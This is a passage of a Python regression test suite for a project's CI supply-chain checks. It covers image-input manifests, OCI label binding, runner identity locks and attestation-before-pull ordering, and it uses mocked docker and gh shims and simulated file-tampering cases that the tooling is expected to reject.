#!/usr/bin/env python3
"""Durable regressions for protected CI identity and fail-closed readers."""

from __future__ import annotations

import gzip
import hashlib
import importlib.util
import io
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[2]
SCRIPTS = REPO_ROOT / "ci/scripts"
COMMIT_A = subprocess.run(
    ["git", "-C", str(REPO_ROOT), "rev-parse", "--verify", "HEAD^{commit}"],
    check=True,
    text=True,
    capture_output=True,
).stdout.strip()
COMMIT_B = "2" * 40
IMAGE_DIGEST = "sha256:" + "3" * 64
LINUX_STABLE_VERSION = "20260816.277.1"
LINUX_ROLLOUT_VERSION = "20260823.283.1"
DARWIN_STABLE_VERSION = "20260727.0256.1"
DARWIN_ROLLOUT_VERSION = "20260824.0311.1"


def run_command(
    *arguments: object,
    expect_success: bool = True,
    environment: dict[str, str] | None = None,
) -> subprocess.CompletedProcess[str]:
    """Run one command at repository root and assert its expected outcome."""
    completed = subprocess.run(
        [str(argument) for argument in arguments],
        cwd=REPO_ROOT,
        env={**os.environ, **(environment or {})},
        text=True,
        capture_output=True,
        check=False,
    )
    if expect_success and completed.returncode != 0:
        raise AssertionError(
            f"command failed ({completed.returncode}): {' '.join(map(str, arguments))}\n"
            f"stdout:\n{completed.stdout}\nstderr:\n{completed.stderr}"
        )
    if not expect_success and completed.returncode == 0:
        raise AssertionError(f"command unexpectedly passed: {' '.join(map(str, arguments))}")
    return completed


def write_runner_identity(path: Path, platform_name: str, image_version: str) -> dict[str, str]:
    """Write one canonical approved runtime identity for an isolated fixture.

    Args:
        path: Fresh output path owned by the calling test.
        platform_name: Exact ``Linux`` or ``Darwin`` lock selection.
        image_version: Exact approved rollout member to resolve.

    Returns:
        The resolved identity written to ``path``.

    Raises:
        AssertionError: The production verifier module cannot be loaded.
        RunnerError: The requested version is not an approved lock member.
    """
    module_path = SCRIPTS / "ci_runner_verify.py"
    module_name = f"ci_runner_fixture_{platform_name.lower()}_{id(path)}"
    specification = importlib.util.spec_from_file_location(module_name, module_path)
    if specification is None or specification.loader is None:
        raise AssertionError("ci_runner_verify.py cannot be loaded")
    module = importlib.util.module_from_spec(specification)
    specification.loader.exec_module(module)
    identity = module.resolve_approved_identity(REPO_ROOT, platform_name, image_version)
    path.write_bytes(module.canonical_identity_bytes(identity))
    return identity


class ImageManifestContractTest(unittest.TestCase):
    """Exercise canonical image-input creation and exact OCI-label binding."""

    @staticmethod
    def _manifest_module(name: str) -> object:
        """Load the protected manifest implementation under a unique name."""
        module_path = SCRIPTS / "ci_image_manifest.py"
        specification = importlib.util.spec_from_file_location(name, module_path)
        if specification is None or specification.loader is None:
            raise AssertionError("ci_image_manifest.py cannot be loaded")
        module = importlib.util.module_from_spec(specification)
        specification.loader.exec_module(module)
        return module

    @staticmethod
    def _copy_canonical_image_inputs(root: Path) -> list[str]:
        """Copy the complete production image-input authority into one fixture."""
        lock = json.loads(
            (REPO_ROOT / "ci/locks/ci-image-lock.json").read_text(encoding="utf-8")
        )
        paths = lock["input_paths"]
        for relative in paths:
            destination = root / relative
            destination.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(REPO_ROOT / relative, destination)
        return paths

    def test_manifest_and_labels_bind_exact_inputs(self) -> None:
        """Accept exact manifest/labels and reject a mismatched manifest label."""
        with tempfile.TemporaryDirectory() as temporary_text:
            temporary = Path(temporary_text)
            manifest = temporary / "manifest.json"
            digest_sidecar = temporary / "manifest.sha256"
            builder_identity_path = temporary / "builder-runner.json"
            builder_identity = write_runner_identity(
                builder_identity_path, "Linux", LINUX_STABLE_VERSION
            )
            created = run_command(
                sys.executable, SCRIPTS / "ci_image_manifest.py", "create",
                "--source-commit", COMMIT_A,
                "--repository", "kevin-zf1123/photospider",
                "--builder-runner-identity", builder_identity_path,
                "--output", manifest,
                "--digest-output", digest_sidecar,
            )
            digest = created.stdout.strip()
            self.assertRegex(digest, r"^[0-9a-f]{64}$")
            self.assertEqual(digest_sidecar.read_text(encoding="utf-8"), digest + "\n")
            manifest_value = json.loads(manifest.read_text(encoding="utf-8"))
            image_lock = json.loads(
                (REPO_ROOT / "ci/locks/ci-image-lock.json").read_text(
                    encoding="utf-8"
                )
            )
            self.assertEqual(
                manifest_value["protected_helpers"], image_lock["protected_helpers"]
            )
            self.assertEqual(manifest_value["builder_runner"], builder_identity)
            manifest_paths = {
                record["path"] for record in manifest_value["inputs"]
            }
            self.assertIn("ci/scripts/ci_image_install.sh", manifest_paths)
            self.assertIn("ci/scripts/integration_suite_gate.py", manifest_paths)
            run_command(
                sys.executable, SCRIPTS / "ci_image_manifest.py", "verify",
                "--source-commit", COMMIT_A,
                "--repository", "kevin-zf1123/photospider",
                "--builder-runner-identity", builder_identity_path,
                "--manifest", manifest,
                "--expected-digest", digest,
            )
            labels = temporary / "labels.json"
            labels.write_text(
                json.dumps(
                    {
                        "org.opencontainers.image.revision": COMMIT_A,
                        "org.photospider.ci.builder-image-version": LINUX_STABLE_VERSION,
                        "org.photospider.ci.input-manifest-sha256": digest,
                    },
                    sort_keys=True,
                ) + "\n",
                encoding="utf-8",
            )
            run_command(
                sys.executable, SCRIPTS / "ci_image_manifest.py", "verify-labels",
                "--manifest", manifest,
                "--labels-json", labels,
                "--source-commit", COMMIT_A,
            )
            labels.write_text(
                json.dumps(
                    {
                        "org.opencontainers.image.revision": COMMIT_A,
                        "org.photospider.ci.builder-image-version": LINUX_STABLE_VERSION,
                        "org.photospider.ci.input-manifest-sha256": "0" * 64,
                    },
                    sort_keys=True,
                ) + "\n",
                encoding="utf-8",
            )
            failed = run_command(
                sys.executable, SCRIPTS / "ci_image_manifest.py", "verify-labels",
                "--manifest", manifest,
                "--labels-json", labels,
                "--source-commit", COMMIT_A,
                expect_success=False,
            )
            self.assertIn("expected", failed.stderr)

    def test_manifest_inputs_use_one_retained_descriptor_snapshot(self) -> None:
        """Reject canonical input aliases and deterministic measurement drift."""
        module = self._manifest_module("ci_image_manifest_retained_input_test")
        with tempfile.TemporaryDirectory() as temporary_text:
            temporary = Path(temporary_text)
            builder_identity_path = temporary / "builder-runner.json"
            builder_identity = write_runner_identity(
                builder_identity_path, "Linux", LINUX_STABLE_VERSION
            )

            def materialize(name: str) -> tuple[Path, list[str]]:
                """Create one independent complete canonical input fixture."""
                root = temporary / name
                root.mkdir()
                return root, self._copy_canonical_image_inputs(root)

            root, paths = materialize("ordinary")
            open_counts = {relative: 0 for relative in paths}
            real_open = module.os.open

            def tracking_open(path: object, flags: int, *arguments: object) -> int:
                """Count every canonical pathname open across imported readers."""
                candidate = Path(path)
                try:
                    relative = candidate.relative_to(root).as_posix()
                except ValueError:
                    relative = ""
                if relative in open_counts:
                    open_counts[relative] += 1
                return real_open(path, flags, *arguments)

            with mock.patch.object(module.os, "open", side_effect=tracking_open):
                manifest = module.create_manifest(
                    root,
                    COMMIT_A,
                    "kevin-zf1123/photospider",
                    builder_identity,
                )
            self.assertEqual(set(record["path"] for record in manifest["inputs"]), set(paths))
            self.assertEqual(open_counts, {relative: 1 for relative in paths})
            for flag_name in ("O_NOFOLLOW", "O_NONBLOCK", "O_CLOEXEC"):
                with self.subTest(missing_manifest_flag=flag_name), mock.patch.object(
                    module.os, flag_name, None
                ), self.assertRaises(module.ManifestError):
                    module.create_manifest(
                        root,
                        COMMIT_A,
                        "kevin-zf1123/photospider",
                        builder_identity,
                    )

            for unsafe_kind in ("symlink", "fifo"):
                with self.subTest(initial_unsafe=unsafe_kind):
                    unsafe_root, _ = materialize(f"initial-{unsafe_kind}")
                    victim = unsafe_root / ".dockerignore"
                    victim.unlink()
                    if unsafe_kind == "symlink":
                        victim.symlink_to(unsafe_root / "Dockerfile.ci")
                    else:
                        os.mkfifo(victim)
                    with self.assertRaises(module.ManifestError):
                        module.create_manifest(
                            unsafe_root,
                            COMMIT_A,
                            "kevin-zf1123/photospider",
                            builder_identity,
                        )

            with self.assertRaises(module.ManifestError):
                module._measure_regular_input(Path("/dev/null"))

            device_root, _ = materialize("initial-device")
            device_victim = device_root / ".dockerignore"
            device_real_open = module.os.open

            def substitute_device(
                path: object, flags: int, *arguments: object
            ) -> int:
                """Return a real character-device descriptor for one input."""
                if Path(path) == device_victim:
                    return device_real_open("/dev/null", flags)
                return device_real_open(path, flags, *arguments)

            with mock.patch.object(
                module.os, "open", side_effect=substitute_device
            ), self.assertRaises(module.ManifestError):
                module.create_manifest(
                    device_root,
                    COMMIT_A,
                    "kevin-zf1123/photospider",
                    builder_identity,
                )

            swap_root, _ = materialize("after-open-swap")
            swap_victim = swap_root / "ci/scripts/ci_image_install.sh"
            same_inode_alias = swap_root / "same-inode-helper"
            os.link(swap_victim, same_inode_alias)

            def swap_after_open(phase: str, path: Path, _descriptor: int) -> None:
                """Replace a helper name with a symlink to its same inode."""
                if phase == "after_open" and path == swap_victim:
                    replacement = swap_root / "helper-link-replacement"
                    replacement.symlink_to(same_inode_alias)
                    os.replace(replacement, swap_victim)

            with self.assertRaises(module.ManifestError):
                module.create_manifest(
                    swap_root,
                    COMMIT_A,
                    "kevin-zf1123/photospider",
                    builder_identity,
                    _test_hook=swap_after_open,
                )

            mutation_root, _ = materialize("first-read-mutation")
            mutation_victim = mutation_root / "Dockerfile.ci"

            def mutate_after_first_read(
                phase: str, path: Path, _descriptor: int
            ) -> None:
                """Rewrite one retained inode after its first complete read."""
                if phase == "after_first_read" and path == mutation_victim:
                    value = bytearray(mutation_victim.read_bytes())
                    value[0] = ord("X") if value[0] != ord("X") else ord("Y")
                    with mutation_victim.open("r+b") as handle:
                        handle.write(value)
                        handle.flush()
                        os.fsync(handle.fileno())

            with self.assertRaises(module.ManifestError):
                module.create_manifest(
                    mutation_root,
                    COMMIT_A,
                    "kevin-zf1123/photospider",
                    builder_identity,
                    _test_hook=mutate_after_first_read,
                )

            helper_root, _ = materialize("helper-final-boundary")
            helper_victim = helper_root / "ci/scripts/integration_suite_gate.py"

            def replace_after_second_read(
                phase: str, path: Path, _descriptor: int
            ) -> None:
                """Replace a helper after measurement but before semantic reuse."""
                if phase == "after_second_read" and path == helper_victim:
                    replacement = helper_root / "replacement-helper"
                    replacement.write_bytes(helper_victim.read_bytes())
                    os.replace(replacement, helper_victim)

            with self.assertRaises(module.ManifestError):
                module.create_manifest(
                    helper_root,
                    COMMIT_A,
                    "kevin-zf1123/photospider",
                    builder_identity,
                    _test_hook=replace_after_second_read,
                )

            cli_root, _ = materialize("cli-symlink")
            cli_victim = cli_root / ".dockerignore"
            cli_victim.unlink()
            cli_victim.symlink_to(cli_root / "Dockerfile.ci")
            cli_output = temporary / "unsafe-cli-manifest.json"
            failed = run_command(
                sys.executable,
                SCRIPTS / "ci_image_manifest.py",
                "--repo-root",
                cli_root,
                "create",
                "--source-commit",
                COMMIT_A,
                "--repository",
                "kevin-zf1123/photospider",
                "--builder-runner-identity",
                builder_identity_path,
                "--output",
                cli_output,
                expect_success=False,
            )
            self.assertRegex(failed.stderr, r"regular file|symbolic links")
            self.assertFalse(cli_output.exists())

    def test_publisher_rejects_head_after_last_image_input_commit(self) -> None:
        """Reject a later manual/push HEAD before registry publication can begin."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text) / "repository"
            lock = root / "ci/locks/ci-image-lock.json"
            lock.parent.mkdir(parents=True)
            lock.write_text(
                (REPO_ROOT / "ci/locks/ci-image-lock.json").read_text(
                    encoding="utf-8"
                ),
                encoding="utf-8",
            )
            (root / "Dockerfile.ci").write_text("FROM scratch\n", encoding="utf-8")
            run_command("git", "-C", root, "init", "-q")
            run_command("git", "-C", root, "config", "user.name", "CI Contract")
            run_command("git", "-C", root, "config", "user.email", "ci@example.invalid")
            run_command("git", "-C", root, "config", "commit.gpgsign", "false")
            run_command("git", "-C", root, "add", "--", "Dockerfile.ci", "ci/locks/ci-image-lock.json")
            run_command("git", "-C", root, "commit", "-q", "-m", "image input")
            image_source = run_command("git", "-C", root, "rev-parse", "HEAD").stdout.strip()
            accepted = run_command(
                sys.executable, SCRIPTS / "ci_image_manifest.py",
                "--repo-root", root,
                "publish-source-commit",
                "--workflow-commit", image_source,
            )
            self.assertEqual(accepted.stdout.strip(), image_source)

            (root / "README.md").write_text("later unrelated commit\n", encoding="utf-8")
            run_command("git", "-C", root, "add", "--", "README.md")
            run_command("git", "-C", root, "commit", "-q", "-m", "unrelated")
            later_head = run_command("git", "-C", root, "rev-parse", "HEAD").stdout.strip()
            self.assertNotEqual(later_head, image_source)
            failed = run_command(
                sys.executable, SCRIPTS / "ci_image_manifest.py",
                "--repo-root", root,
                "publish-source-commit",
                "--workflow-commit", later_head,
                expect_success=False,
            )
            self.assertIn("differs from workflow commit", failed.stderr)
            self.assertIn("refusing an unattestable publication", failed.stderr)

        workflow = (REPO_ROOT / ".github/workflows/build-ci-image.yml").read_text(
            encoding="utf-8"
        )
        guard = workflow.index("publish-source-commit")
        self.assertLess(guard, workflow.index("uses: docker/login-action@"))
        self.assertLess(guard, workflow.index("uses: docker/build-push-action@"))
        self.assertNotIn('--source-commit "${{ github.sha }}"', workflow)

    def test_manifest_rejects_builder_removed_from_rollout_authority(self) -> None:
        """Reject retained builder provenance removed by a reviewed lock update."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text) / "repository"
            image_lock = json.loads(
                (REPO_ROOT / "ci/locks/ci-image-lock.json").read_text(encoding="utf-8")
            )
            for relative in image_lock["input_paths"]:
                destination = root / relative
                destination.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(REPO_ROOT / relative, destination)
            linux_lock_path = root / "ci/locks/linux-runner-lock.json"
            linux_lock = json.loads(linux_lock_path.read_text(encoding="utf-8"))
            linux_lock["approved_image_versions"].remove(LINUX_STABLE_VERSION)
            linux_lock_path.write_text(
                json.dumps(linux_lock, sort_keys=True, indent=2) + "\n",
                encoding="utf-8",
            )
            retained = Path(temporary_text) / "removed-builder.json"
            write_runner_identity(retained, "Linux", LINUX_STABLE_VERSION)
            failed = run_command(
                sys.executable,
                SCRIPTS / "ci_image_manifest.py",
                "--repo-root",
                root,
                "create",
                "--source-commit",
                COMMIT_A,
                "--repository",
                "kevin-zf1123/photospider",
                "--builder-runner-identity",
                retained,
                "--output",
                Path(temporary_text) / "manifest.json",
                expect_success=False,
            )
            self.assertIn("not uniquely approved", failed.stderr)

    def test_published_identity_requires_attestation_before_output(self) -> None:
        """Exercise the shell resolver with exact mocked registry and gh boundaries."""
        with tempfile.TemporaryDirectory() as temporary_text:
            temporary = Path(temporary_text)
            source = run_command(
                sys.executable, SCRIPTS / "ci_image_manifest.py", "source-commit"
            ).stdout.strip()
            manifest = temporary / "precomputed.json"
            builder_identity_path = temporary / "builder-runner.json"
            write_runner_identity(
                builder_identity_path, "Linux", LINUX_ROLLOUT_VERSION
            )
            digest = run_command(
                sys.executable, SCRIPTS / "ci_image_manifest.py", "create",
                "--source-commit", source,
                "--repository", "kevin-zf1123/photospider",
                "--builder-runner-identity", builder_identity_path,
                "--output", manifest,
            ).stdout.strip()
            binary_dir = temporary / "bin"
            binary_dir.mkdir()
            docker_log = temporary / "docker.log"
            gh_log = temporary / "gh.log"
            command_log = temporary / "command-order.log"
            docker = binary_dir / "docker"
            docker.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "printf '%q ' \"$@\" >> \"$CI_TEST_DOCKER_LOG\"; printf '\\n' >> \"$CI_TEST_DOCKER_LOG\"\n"
                "case \"${1:-} ${2:-} ${3:-}\" in\n"
                "  'buildx imagetools inspect') event=docker-imagetools-inspect ;;\n"
                "  'image inspect --format') event=docker-image-inspect ;;\n"
                "  *) if [[ ${1:-} == pull ]]; then event=docker-pull; else event=docker-other; fi ;;\n"
                "esac\n"
                "printf '%s\\n' \"$event\" >> \"$CI_TEST_COMMAND_LOG\"\n"
                "case \"${1:-} ${2:-} ${3:-}\" in\n"
                "  'buildx imagetools inspect') printf 'Name: test\\nDigest: %s\\n' \"$CI_TEST_IMAGE_DIGEST\" ;;\n"
                "  'image inspect --format') printf '{\"org.opencontainers.image.revision\":\"%s\",\"org.photospider.ci.builder-image-version\":\"%s\",\"org.photospider.ci.input-manifest-sha256\":\"%s\"}\\n' \"$CI_TEST_SOURCE_COMMIT\" \"$CI_TEST_BUILDER_IMAGE_VERSION\" \"$CI_TEST_MANIFEST_DIGEST\" ;;\n"
                "  *) exit 0 ;;\n"
                "esac\n",
                encoding="utf-8",
            )
            docker.chmod(0o755)
            gh = binary_dir / "gh"
            gh.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "printf '%q ' \"$@\" >> \"$CI_TEST_GH_LOG\"; printf '\\n' >> \"$CI_TEST_GH_LOG\"\n"
                "printf 'gh-attestation\\n' >> \"$CI_TEST_COMMAND_LOG\"\n"
                "if [[ ${CI_TEST_GH_FAIL:-0} == 1 ]]; then\n"
                "  printf 'mock attestation rejection\\n' >&2\n"
                "  exit 41\n"
                "fi\n"
                "printf '[]\\n'\n",
                encoding="utf-8",
            )
            gh.chmod(0o755)
            python = binary_dir / "python3"
            python.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "event=python-other\n"
                "for argument in \"$@\"; do\n"
                "  case $argument in\n"
                "    source-commit) event=python-source-commit ;;\n"
                "    builder-from-labels) event=python-builder-from-labels ;;\n"
                "    create) event=python-manifest-create ;;\n"
                "    verify-labels) event=python-verify-labels ;;\n"
                "  esac\n"
                "done\n"
                "if [[ ${1:-} == */ci_runner_verify.py ]]; then event=python-runner-verify; fi\n"
                "printf '%s\\n' \"$event\" >> \"$CI_TEST_COMMAND_LOG\"\n"
                "if [[ ${1:-} == */ci_runner_verify.py ]]; then\n"
                "  output=\n"
                "  while (($#)); do\n"
                "    if [[ $1 == --output ]]; then output=${2:-}; shift 2; else shift; fi\n"
                "  done\n"
                "  [[ -n $output ]]\n"
                "  printf '%s\\n' \"$CI_TEST_VERIFIER_RUNNER_JSON\" > \"$output\"\n"
                "  printf '%s\\n' \"$CI_TEST_VERIFIER_RUNNER_JSON\"\n"
                "  exit 0\n"
                "fi\n"
                f"exec {sys.executable!s} \"$@\"\n",
                encoding="utf-8",
            )
            python.chmod(0o755)
            output = temporary / "identity.env"
            image_digest = "sha256:" + "4" * 64
            environment = {
                "PATH": f"{binary_dir}:{os.environ['PATH']}",
                "CI_ARTIFACT_DIR": str(temporary / "artifacts"),
                "CI_IMAGE_EXPECTED_MANIFEST_DIGEST": digest,
                "CI_IMAGE_EXPECTED_SOURCE_COMMIT": source,
                "CI_IMAGE_EXPECTED_WORKFLOW_COMMIT": COMMIT_A,
                "CI_IMAGE_OUTPUT_FILE": str(output),
                "CI_IMAGE_REPOSITORY": "kevin-zf1123/photospider",
                "CI_TEST_BUILDER_IMAGE_VERSION": LINUX_ROLLOUT_VERSION,
                "CI_TEST_COMMAND_LOG": str(command_log),
                "CI_TEST_DOCKER_LOG": str(docker_log),
                "CI_TEST_GH_LOG": str(gh_log),
                "CI_TEST_IMAGE_DIGEST": image_digest,
                "CI_TEST_MANIFEST_DIGEST": digest,
                "CI_TEST_SOURCE_COMMIT": source,
                "CI_TEST_VERIFIER_RUNNER_JSON": json.dumps(
                    write_runner_identity(
                        temporary / "verifier-runner.json",
                        "Linux",
                        LINUX_STABLE_VERSION,
                    ),
                    sort_keys=True,
                    separators=(",", ":"),
                ),
            }
            run_command("bash", SCRIPTS / "ci_image_verify.sh", environment=environment)
            outputs = output.read_text(encoding="utf-8")
            self.assertEqual(
                (temporary / "artifacts/attestation-verification.json").read_text(
                    encoding="utf-8"
                ),
                "[]\n",
            )
            self.assertTrue(
                (temporary / "artifacts/verifier-linux-runner-identity.json").is_file()
            )
            self.assertIn(f"digest={image_digest}", outputs)
            self.assertIn(
                f"builder_image_version={LINUX_ROLLOUT_VERSION}", outputs
            )
            self.assertIn(
                f"image=ghcr.io/kevin-zf1123/photospider/photospider-ci@{image_digest}",
                outputs,
            )
            gh_arguments = gh_log.read_text(encoding="utf-8")
            self.assertIn("attestation verify", gh_arguments)
            self.assertIn("--deny-self-hosted-runners", gh_arguments)
            self.assertIn(f"--source-digest {source}", gh_arguments)
            self.assertIn(f"--signer-digest {source}", gh_arguments)
            command_order = command_log.read_text(encoding="utf-8").splitlines()
            required_order = (
                "docker-imagetools-inspect",
                "python-source-commit",
                "gh-attestation",
                "python-runner-verify",
                "docker-pull",
                "docker-image-inspect",
                "python-builder-from-labels",
                "python-manifest-create",
                "python-verify-labels",
            )
            self.assertEqual(
                [command_order.index(event) for event in required_order],
                sorted(command_order.index(event) for event in required_order),
            )

            failed_artifact = temporary / "attestation-failed-artifacts"
            failed_output = temporary / "attestation-failed.env"
            failed_output.write_text("sentinel=unchanged\n", encoding="utf-8")
            command_log.write_text("", encoding="utf-8")
            failed = run_command(
                "bash",
                SCRIPTS / "ci_image_verify.sh",
                environment={
                    **environment,
                    "CI_ARTIFACT_DIR": str(failed_artifact),
                    "CI_IMAGE_OUTPUT_FILE": str(failed_output),
                    "CI_TEST_GH_FAIL": "1",
                },
                expect_success=False,
            )
            self.assertEqual(failed.returncode, 41)
            failed_order = command_log.read_text(encoding="utf-8").splitlines()
            self.assertIn("gh-attestation", failed_order)
            for forbidden_event in (
                "python-runner-verify",
                "docker-pull",
                "docker-image-inspect",
                "python-builder-from-labels",
                "python-manifest-create",
                "python-verify-labels",
            ):
                self.assertNotIn(forbidden_event, failed_order)
            self.assertFalse(failed_artifact.exists())
            self.assertEqual(
                failed_output.read_text(encoding="utf-8"), "sentinel=unchanged\n"
            )

            candidate_output = temporary / "candidate-identity.env"
            candidate_locator = (
                "ghcr.io/kevin-zf1123/photospider/photospider-ci:"
                f"candidate-{COMMIT_A}-1-1"
            )
            docker_log.write_text("", encoding="utf-8")
            candidate_environment = {
                **environment,
                "CI_ARTIFACT_DIR": str(temporary / "candidate-artifacts"),
                "CI_IMAGE_EXPECTED_DIGEST": image_digest,
                "CI_IMAGE_LOCATOR": candidate_locator,
                "CI_IMAGE_OUTPUT_FILE": str(candidate_output),
            }
            run_command(
                "bash", SCRIPTS / "ci_image_verify.sh",
                environment=candidate_environment,
            )
            self.assertIn(candidate_locator, docker_log.read_text(encoding="utf-8"))
            self.assertIn(f"digest={image_digest}", candidate_output.read_text(encoding="utf-8"))

            exact_output = temporary / "exact-identity.env"
            exact_locator = (
                "ghcr.io/kevin-zf1123/photospider/photospider-ci@"
                f"{image_digest}"
            )
            run_command(
                "bash", SCRIPTS / "ci_image_verify.sh",
                environment={
                    **candidate_environment,
                    "CI_ARTIFACT_DIR": str(temporary / "exact-artifacts"),
                    "CI_IMAGE_LOCATOR": exact_locator,
                    "CI_IMAGE_OUTPUT_FILE": str(exact_output),
                },
            )
            self.assertIn(f"image={exact_locator}", exact_output.read_text(encoding="utf-8"))

            forged_cases = (
                (
                    "manifest",
                    {"CI_IMAGE_EXPECTED_MANIFEST_DIGEST": "5" * 64},
                    "manifest digest differs",
                ),
                (
                    "source",
                    {"CI_IMAGE_EXPECTED_SOURCE_COMMIT": COMMIT_B},
                    "source commit differs",
                ),
                (
                    "workflow",
                    {"CI_IMAGE_EXPECTED_WORKFLOW_COMMIT": COMMIT_B},
                    "Protected checkout differs",
                ),
                (
                    "digest",
                    {"CI_IMAGE_EXPECTED_DIGEST": "sha256:" + "5" * 64},
                    "differs from expected",
                ),
                (
                    "builder-unknown",
                    {"CI_TEST_BUILDER_IMAGE_VERSION": "20991231.999.1"},
                    "is not approved",
                ),
                (
                    "builder-approved-tamper",
                    {"CI_TEST_BUILDER_IMAGE_VERSION": LINUX_STABLE_VERSION},
                    "manifest digest differs",
                ),
                (
                    "digest-ref",
                    {
                        "CI_IMAGE_LOCATOR": (
                            "ghcr.io/kevin-zf1123/photospider/photospider-ci@"
                            "sha256:" + "6" * 64
                        )
                    },
                    "resolved to a different OCI digest",
                ),
                (
                    "repository-ref",
                    {
                        "CI_IMAGE_LOCATOR": (
                            "ghcr.io/kevin-zf1123/forged/photospider-ci@"
                            f"{image_digest}"
                        )
                    },
                    "repository differs",
                ),
            )
            for label, override, diagnostic in forged_cases:
                with self.subTest(forged_identity=label):
                    mismatch = run_command(
                        "bash",
                        SCRIPTS / "ci_image_verify.sh",
                        environment={
                            **candidate_environment,
                            **override,
                            "CI_ARTIFACT_DIR": str(
                                temporary / f"mismatch-{label}-artifacts"
                            ),
                            "CI_IMAGE_OUTPUT_FILE": str(
                                temporary / f"mismatch-{label}.env"
                            ),
                        },
                        expect_success=False,
                    )
                    self.assertIn(diagnostic, mismatch.stderr)

    def test_image_resolver_static_order_rejects_pre_attestation_pull(self) -> None:
        """Reject active layer pull or absent attestation in the protected order."""
        module_path = SCRIPTS / "ci_lock_verify.py"
        specification = importlib.util.spec_from_file_location(
            "ci_lock_verify_image_resolver_order_test", module_path
        )
        if specification is None or specification.loader is None:
            raise AssertionError("ci_lock_verify.py cannot be loaded")
        module = importlib.util.module_from_spec(specification)
        specification.loader.exec_module(module)
        module._verify_ci_image_resolver_order(REPO_ROOT)

        source = (SCRIPTS / "ci_image_verify.sh").read_text(encoding="utf-8")
        attestation = 'attestation_json=$(gh attestation verify "oci://$exact_image" \\'
        pull = 'docker pull "$exact_image" >/dev/null'
        self.assertEqual(source.count(attestation), 1)
        self.assertEqual(source.count(pull), 1)
        for label, mutation in (
            (
                "pull-before-attestation",
                source.replace(attestation, "__ATTESTATION_COMMAND__", 1)
                .replace(pull, attestation, 1)
                .replace("__ATTESTATION_COMMAND__", pull, 1),
            ),
            (
                "commented-attestation",
                source.replace(attestation, "# " + attestation, 1),
            ),
        ):
            with self.subTest(mutation=label), tempfile.TemporaryDirectory() as text:
                root = Path(text)
                script = root / "ci/scripts/ci_image_verify.sh"
                script.parent.mkdir(parents=True)
                script.write_text(mutation, encoding="utf-8")
                with self.assertRaises(module.ContractError):
                    module._verify_ci_image_resolver_order(root)

    def test_bilingual_docker_reproduction_separates_local_and_provenance(
        self,
    ) -> None:
        """Keep local solver sentinels separate from hosted builder provenance.

        Returns:
            None after both language blocks parse and the real installer accepts
            only the independent 64/40-hex shapes before its first external
            architecture command under every available maintained Bash.

        Raises:
            AssertionError: Documentation, CLI parsing, sentinel shape/order,
                nonpublication wording, or installer preflight behavior drifts.

        Note:
            The ``dpkg`` shim stops at the first external boundary; no snapshot,
            package, Docker, registry, or network operation is performed.
        """
        english = (REPO_ROOT / "docs/CI/github-actions.md").read_text(
            encoding="utf-8"
        )
        chinese = (REPO_ROOT / "docs/CI/zh/github-actions.zh.md").read_text(
            encoding="utf-8"
        )

        def fenced_block(text: str, marker: str) -> str:
            """Extract the unique Bash fence containing one stable marker."""
            self.assertEqual(text.count(marker), 1)
            marker_index = text.index(marker)
            start = text.rfind("```bash\n", 0, marker_index)
            end = text.index("\n```", marker_index)
            self.assertGreaterEqual(start, 0)
            return text[start + len("```bash\n") : end]

        local_marker = (
            "# Local layer-solver reproduction only; never publish or attest "
            "this image."
        )
        hosted_marker = (
            "# Approved Linux hosted runner only; this constructs publish "
            "provenance."
        )
        local = fenced_block(english, local_marker)
        hosted = fenced_block(english, hosted_marker)
        self.assertEqual(local, fenced_block(chinese, local_marker))
        self.assertEqual(hosted, fenced_block(chinese, hosted_marker))
        self.assertIn("docker build --no-cache", local)
        manifest_match = re.search(
            r"^local_ci_manifest_sentinel=([0-9a-f]+)$", local, re.MULTILINE
        )
        source_match = re.search(
            r"^local_ci_source_sentinel=([0-9a-f]+)$", local, re.MULTILINE
        )
        self.assertIsNotNone(manifest_match)
        self.assertIsNotNone(source_match)
        manifest_sentinel = manifest_match.group(1)
        source_sentinel = source_match.group(1)
        self.assertRegex(manifest_sentinel, r"^[0-9a-f]{64}$")
        self.assertRegex(source_sentinel, r"^[0-9a-f]{40}$")
        self.assertNotEqual(manifest_sentinel, source_sentinel)
        self.assertNotIn("local-layer-solver-only-not-publishable", local)
        self.assertNotIn("ci_image_manifest.py create", local)
        self.assertLess(
            hosted.index("ci_runner_verify.py"),
            hosted.index("ci_image_manifest.py create"),
        )
        self.assertLess(
            hosted.index("publish-source-commit"),
            hosted.index("ci_image_manifest.py create"),
        )
        self.assertIn(
            '--builder-runner-identity "$builder_runner_identity"', hosted
        )
        shell_candidates = [Path("/bin/bash")]
        path_bash = shutil.which("bash")
        if path_bash is not None:
            shell_candidates.append(Path(path_bash))
        shells: list[Path] = []
        for candidate in shell_candidates:
            resolved = candidate.resolve()
            if candidate.is_file() and resolved not in shells:
                shells.append(resolved)
        self.assertTrue(shells)
        for shell in shells:
            for block in (local, hosted):
                syntax = subprocess.run(
                    [str(shell), "-n"],
                    input=block,
                    text=True,
                    capture_output=True,
                    check=False,
                )
                self.assertEqual(syntax.returncode, 0, msg=syntax.stderr)

        command_start = hosted.index("ci_image_manifest_digest=$(")
        self.assertTrue(hosted.endswith(")"))
        command_end = len(hosted) - 1
        command = hosted[
            command_start + len("ci_image_manifest_digest=$(") : command_end
        ]
        command = re.sub(r"\\\n[ ]*", " ", command)
        arguments = shlex.split(command)
        self.assertEqual(
            arguments[:2], ["python3", "ci/scripts/ci_image_manifest.py"]
        )
        parser = self._manifest_module(
            "ci_image_manifest_documented_command_test"
        ).build_parser()
        parsed = parser.parse_args(arguments[2:])
        self.assertEqual(parsed.command, "create")
        self.assertEqual(
            str(parsed.builder_runner_identity), "$builder_runner_identity"
        )

        with tempfile.TemporaryDirectory() as temporary_text:
            temporary = Path(temporary_text)
            binary_directory = temporary / "bin"
            binary_directory.mkdir()
            dpkg_log = temporary / "dpkg.log"
            forbidden_log = temporary / "forbidden.log"
            dpkg = binary_directory / "dpkg"
            dpkg.write_text(
